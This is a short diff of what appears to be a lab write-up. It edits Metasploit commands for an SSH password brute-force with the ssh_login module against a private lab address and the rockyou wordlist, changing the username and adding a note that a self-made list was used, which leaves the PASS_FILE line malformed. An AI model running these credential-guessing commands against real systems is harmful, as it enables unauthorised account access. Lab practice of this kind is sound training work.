@@ -94,8 +94,8 @@ msfconsole
 
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.56.10
-set USERNAME testuser
-set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME lako
+set PASS_FILE /usr/share/wordlists/rockyou.txt (I used list that was created by me)
 set THREADS 5
 set VERBOSE true
 run
